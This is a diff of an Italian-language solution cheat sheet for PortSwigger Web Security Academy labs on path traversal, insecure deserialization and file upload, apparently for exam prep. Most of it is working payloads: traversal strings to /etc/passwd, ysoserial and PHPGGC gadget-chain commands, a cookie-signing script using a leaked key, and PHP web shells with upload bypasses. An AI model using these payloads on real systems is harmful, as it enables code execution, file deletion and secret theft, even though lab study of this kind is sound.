-- Soluzione: includere la cartella base richiesta all'inizio, seguita da sequenze di traversal per uscirne.
-- Payload: `filename=/var/www/images/../../../etc/passwd`
+- Segnale: l'app richiede che il filename inizi con la cartella base attesa (`/var/www/images`).
+- Soluzione: includi la cartella base all'inizio, seguita da sequenze di traversal per uscirne.
+- Payload (parametro `filename`):
+```
+/var/www/images/../../../etc/passwd
+```
 - Link: [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
 
 **5. Bypass di validazione sull'estensione del file (null byte)**
 
-- Segnale: l'app richiede che il filename termini con un'estensione specifica (es. `.png`).
-- Soluzione: usare un byte null per troncare effettivamente il path prima dell'estensione richiesta (tecnica efficace solo su stack/parser più vecchi/vulnerabili al null byte).
-- Payload: `filename=../../../etc/passwd%00.png`
+- Segnale: l'app richiede che il filename termini con un'estensione specifica (`.png`).
+- Soluzione: usa un null byte per troncare il path prima dell'estensione richiesta.
+- Payload (parametro `filename`):
+```
+../../../etc/passwd%00.png
+```
 - Link: [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
+## Insecure deserialization — Stage tipico: 2-3
 
-## Insecure deserialization — Stage tipico: 3
+**Come riconoscerla (generale):** cerca dati che sembrano oggetti serializzati in cookie/parametri (PHP: stringa leggibile tipo `O:4:"User":2:{s:4:"name"...}`; Java: inizia con byte `ac ed` hex / `rO0` in Base64); verifica se riesci a modificarli e se vengono accettati dopo la deserializzazione. In Burp usa l'**Inspector** per editare l'oggetto nel cookie di sessione (ri-codifica automatica). Spazia dal semplice auth-bypass editando i campi (Stage 2) alla RCE via gadget chain (Stage 3).
 
-**Come riconoscerla (generale):** cerca dati che sembrano oggetti serializzati in cookie/parametri (PHP: stringa leggibile tipo `O:4:"User":2:{s:4:"name"...}`; Java: inizia con byte `ac ed` hex / `rO0` in Base64); verifica se riesci a modificarli e se vengono accettati dal server dopo la deserializzazione.
+**1. Modificare i tipi di dato nell'oggetto serializzato (auth bypass)**
 
-**1. Modificare i tipi di dato nell'oggetto serializzato**
-
-- Segnale: codice PHP usa il confronto debole (`==`) tra un valore deserializzato (es. password) e un valore atteso; PHP tratta stringhe che iniziano con un numero come quel numero nel confronto debole.
-- Soluzione: cambiare il tipo/valore dell'attributo serializzato (es. da stringa a intero `0`), aggiornando anche l'indicatore di lunghezza/tipo nella stringa serializzata, così il confronto debole restituisce `true` inaspettatamente (bypass di autenticazione).
-- Payload: `O:4:"User":2:{s:8:"username";s:6:"carlos";s:8:"password";i:0;}` (cambiare `s:X:"..."` in `i:0;` per il campo password)
-- Link: [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+- Segnale: il cookie di sessione è un oggetto PHP serializzato con `username` e `access_token`; l'app confronta l'access token con `==` (confronto debole): un intero `0` passa il controllo.
+- Soluzione: nell'Inspector modifica l'oggetto: `username` → `administrator` (lunghezza 13), `access_token` → intero `0` (togli le virgolette e cambia il tipo `s` in `i`). Poi vai su `/admin` e `/admin/delete?username=carlos`.
+- Payload — cookie di sessione (oggetto modificato):
+```
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
+- Payload — delete carlos (da admin):
+```
+GET /admin/delete?username=carlos
+```
+- Link: [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
 
 **2. Usare la funzionalità dell'app per sfruttare la deserializzazione insicura**
 
-- Segnale: una funzionalità esistente (es. "elimina utente") esegue un'operazione pericolosa (es. cancellazione file) su un attributo dell'oggetto deserializzato (es. `image_location`).
-- Soluzione: modificare quell'attributo nell'oggetto serializzato per puntare a un file arbitrario, poi invocare la funzionalità legittima (es. eliminare il proprio account) che userà quel valore controllato per l'operazione pericolosa.
-- Payload: modificare `s:14:"image_location";s:...:"<path-originale>"` in un path arbitrario, es. `s:30:"/path/to/some/other/file.txt"`
+- Segnale: `POST /my-account/delete` elimina l'account usando l'attributo `avatar_link` dell'oggetto deserializzato per cancellare il file dell'avatar → se punti `avatar_link` a un altro file, verrà cancellato quello.
+- Soluzione: nell'Inspector punta `avatar_link` a `/home/carlos/morale.txt` (aggiorna l'indicatore di lunghezza a 23), poi invia `POST /my-account/delete`.
+- Payload — attributo modificato nel cookie:
+```
+s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
+```
 - Link: [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
 
 **3. Injection di oggetti arbitrari in PHP**
 
-- Segnale: hai accesso al codice sorgente (o puoi dedurre le classi disponibili); esiste una classe con un "magic method" (es. `__wakeup()`, `__destruct()`) che esegue operazioni pericolose su attributi controllabili, invocato automaticamente durante la deserializzazione.
-- Soluzione: costruire un oggetto serializzato appartenente a *quella* classe (anche se diversa dalla classe normalmente attesa dall'app) e inviarlo al punto di deserializzazione; il magic method verrà invocato automaticamente.
-- Payload: es. `O:9:"CustomTemplate":1:{s:14:"template_file_path";s:30:"/path/to/dangerous/file";}` (nome classe e attributi dipendono dal codice sorgente analizzato)
+- Segnale: il sito referenzia `/libs/CustomTemplate.php`; appendendo `~` al filename (`/libs/CustomTemplate.php~`) leggi il sorgente. La classe `CustomTemplate` ha un magic method `__destruct()` che chiama `unlink()` su `lock_file_path` → object injection.
+- Soluzione: costruisci in Decoder un oggetto `CustomTemplate` con `lock_file_path=/home/carlos/morale.txt`, poi Base64+URL-encode e usalo come cookie di sessione. Alla deserializzazione `__destruct()` cancella il file.
+- Payload — oggetto serializzato (poi Base64 + URL-encode nel cookie):
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
 - Link: [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
 
-**4. Sfruttare la deserializzazione Java con Apache Commons Collections (ysoserial)**
+**4. Sfruttare la deserializzazione Java con Apache Commons (ysoserial)**
 
-- Segnale: l'app Java deserializza dati controllabili e usa (direttamente o come dipendenza) la libreria Apache Commons Collections, nota per catene di gadget pubblicamente documentate.
-- Soluzione: usare il tool `ysoserial` per generare un oggetto serializzato malevolo basato sulla gadget chain `CommonsCollections` (o simile) che esegue un comando arbitrario, poi inviarlo al punto di deserializzazione dell'app.
-- Payload: `java -jar ysoserial-all.jar CommonsCollections6 'comando-da-eseguire' | base64` → inviare il risultato come oggetto serializzato (es. in un cookie/header)
+- Segnale: il cookie contiene un oggetto Java serializzato (`rO0...`); l'app carica Apache Commons Collections → gadget chain nota.
+- Soluzione: genera con `ysoserial` un oggetto `CommonsCollections4` che esegue il comando, mettilo nel cookie e **URL-encodalo**. Su Java ≥16 servono i flag `--add-opens`.
+- Payload — ysoserial (Java ≥16):
+```
+java \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+```
+- Payload — ysoserial (Java ≤15):
+```
+java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+```
 - Link: [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
 
 **5. Sfruttare la deserializzazione PHP con una gadget chain pre-costruita (PHPGGC)**
 
-- Segnale: l'app PHP usa un framework/libreria nota (es. Symfony, Laravel, Monolog) con gadget chain pubblicamente documentate in PHPGGC.
-- Soluzione: usare il tool `PHPGGC` per generare un payload serializzato basato su una gadget chain nota per quella libreria, mirato a RCE o altra azione dannosa.
-- Payload: `phpggc Monolog/RCE1 system 'comando-da-eseguire' -b` (output base64 da inviare come oggetto serializzato)
+- Segnale: il cookie è un token Base64 (oggetto PHP serializzato) **firmato** con HMAC-SHA1. Un commento svela `/cgi-bin/phpinfo.php` e l'errore rivela **Symfony 4.3.6**; `phpinfo.php` espone `SECRET_KEY`.
+- Soluzione: genera l'oggetto con PHPGGC (`Symfony/RCE4`), poi firma il cookie con la secret key leakata usando lo script PHP.
+- Payload — PHPGGC:
+```
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+```
+- Payload — script PHP per firmare il cookie:
+```php
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```
 - Link: [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
 
 **6. Sfruttare la deserializzazione Ruby con una gadget chain documentata**
 
-- Segnale: l'app è basata su Ruby (es. Rails) e usa la serializzazione (`marshal`); non esiste un tool pronto come ysoserial/PHPGGC, ma online sono documentati exploit/gadget chain per Ruby.
-- Soluzione: cercare online una gadget chain documentata per la versione del framework Ruby in uso, adattarla manualmente al contesto del target per costruire l'oggetto serializzato malevolo.
-- Payload: dipende dalla chain documentata trovata (tipicamente generata con uno script Ruby che produce l'oggetto Marshal malevolo, poi inviato all'app)
+- Segnale: il cookie contiene un oggetto Ruby serializzato ("marshaled"); framework Ruby on Rails → esiste una gadget chain universale documentata (vakzz, devcraft.io) per Ruby 2.x-3.x.
+- Soluzione: prendi lo script finale di vakzz, cambia il comando da `id` a `rm /home/carlos/morale.txt`, sostituisci le ultime due righe con `puts Base64.encode64(payload)`; esegui, metti l'output nel cookie e **URL-encodalo**.
+- Payload — modifiche allo script (output del payload):
+```ruby
+# comando: rm /home/carlos/morale.txt
+puts Base64.encode64(payload)
+```
 - Link: [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
-
 
 ## File upload vulnerabilities — Stage tipico: 3
 
-**Come riconoscerla (generale):** l'app permette upload di file (tipicamente immagini); prova a caricare una web shell PHP/JSP (`<?php echo system($_GET['command']); ?>`); se bloccato da validazione, cerca discrepanze tra come viene validato il file e come viene eseguito/servito dal server.
+**Come riconoscerla (generale):** l'app permette upload di file (tipicamente avatar immagine via `POST /my-account/avatar`, serviti da `GET /files/avatars/<file>`); carica una web shell PHP e prova a eseguirla richiedendola. Se bloccato da validazione, cerca discrepanze tra come il file è validato e come viene servito/eseguito. Web shell usata nei lab (esfiltra il secret):
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
 
 **1. Upload web shell via path traversal**
 
-- Segnale: il server impedisce l'esecuzione di script nella cartella di upload (configurazione più permissiva altrove), ma il nome del file caricato non è validato contro sequenze di traversal.
-- Soluzione: usare un nome file con sequenza di traversal nel campo `filename` della richiesta multipart, per far finire la web shell in una directory diversa (con permessi di esecuzione) da quella di upload prevista.
-- Payload: header multipart `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
+- Segnale: puoi caricare `.php`, ma la cartella di upload (`/files/avatars/`) non esegue gli script (ritorna il sorgente). Il `filename` però non è validato contro il traversal.
+- Soluzione: aggiungi una sequenza di traversal al `filename` per far finire la shell in una cartella superiore eseguibile (`/files`). Il `../` viene strippato, ma offuscando `/` con `%2f` passa (il server URL-decoda). Poi richiedi il file.
+- Payload — `filename` nella richiesta multipart (POST /my-account/avatar):
+```
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+```
+- Payload — esecuzione (il file è salito di una dir → eseguibile):
+```
+GET /files/avatars/..%2fexploit.php
+```
 - Link: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
 
-**2. Bypass di blacklist delle estensioni (override della configurazione del server)**
+**2. Bypass di blacklist delle estensioni (.htaccess)**
 
-- Segnale: l'estensione `.php` è bloccata da una blacklist, ma il server (es. Apache) permette di caricare file di configurazione custom per-directory (`.htaccess`) che non sono a loro volta bloccati.
-- Soluzione: caricare un file `.htaccess` malevolo che mappa un'estensione arbitraria/non bloccata a un tipo MIME eseguibile, poi caricare la web shell con quell'estensione.
-- Payload: `.htaccess` con contenuto `AddType application/x-httpd-php .l33t`, poi upload di `exploit.l33t` contenente PHP
+- Segnale: `.php` è in blacklist, ma il server è **Apache** con `mod_php` e non blocca `.htaccess`.
+- Soluzione: carica un `.htaccess` (Content-Type `text/plain`) che mappa un'estensione arbitraria al MIME PHP, poi carica la shell con quell'estensione (`exploit.l33t`) ed eseguila.
+- Payload — contenuto del file `.htaccess` (filename `.htaccess`, Content-Type `text/plain`):
+```
+AddType application/x-httpd-php .l33t
+```
+- Payload — poi carica la shell come `exploit.l33t` e richiedila:
+```
+GET /files/avatars/exploit.l33t
+```
 - Link: [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
 
-**3. Bypass tramite offuscamento dell'estensione del file**
+**3. Bypass tramite offuscamento dell'estensione (null byte)**
 
-- Segnale: la blacklist/whitelist è case-sensitive o non gestisce correttamente doppie estensioni, caratteri finali, encoding, null byte o unicode multibyte.
-- Soluzione: provare varianti come maiuscole/minuscole mischiate, doppia estensione, punti finali, URL-encoding dei punti, byte null, o posizionare la stringa bloccata in modo che la sua rimozione lasci comunque un'estensione valida.
-- Payload: es. `exploit.php.jpg`, `exploit.php.`, `exploit.p.phphp` (rimuovendo `.php` resta `.php`), `exploit.pHp`
+- Segnale: l'app accetta solo JPG/PNG (whitelist sull'estensione), ma è vulnerabile al null byte: tutto dopo `%00` viene scartato dopo il controllo.
+- Soluzione: nel `filename` metti `exploit.php%00.jpg` → il controllo vede `.jpg`, ma il file salvato è `exploit.php`. Poi richiedilo.
+- Payload — `filename` nella richiesta multipart:
+```
+Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
+```
+- Payload — esecuzione:
+```
+GET /files/avatars/exploit.php
+```
 - Link: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
 
 **4. RCE via upload di web shell polyglot**
 
-- Segnale: il server valida il contenuto del file (non solo `Content-Type`/estensione), verificando proprieta intrinseche (dimensioni immagine) o magic bytes (es. `FF D8 FF` per JPEG).
-- Soluzione: creare un file polyglot che è un'immagine JPEG valida (passa i controlli sui magic bytes/dimensioni) ma contiene codice PHP nei metadata EXIF, usando un tool come ExifTool; se il server lo serve/esegue da una posizione eseguibile, il codice PHP nei metadata viene eseguito.
-- Payload: `exiftool -Comment="<?php echo system($_GET['command']); ?>" originale.jpg -o polyglot.php` poi caricare `polyglot.php`
+- Segnale: il server valida il **contenuto** (immagine genuina), non solo estensione/Content-Type.
+- Soluzione: crea un polyglot che è un'immagine JPEG valida ma contiene il PHP nei metadata EXIF (campo Comment), salvato con estensione `.php`; caricalo e richiedilo, cercando l'output tra i marker `START`/`END` nei dati binari.
+- Payload — creazione del polyglot con ExifTool:
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" INPUT.jpg -o polyglot.php
+```
+- Payload — esecuzione (cerca `START ... END` nella risposta):
+```
+GET /files/avatars/polyglot.php
+```
 - Link: [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
-
 
 ## Essential skills — Stage tipico: 1-2-3
 
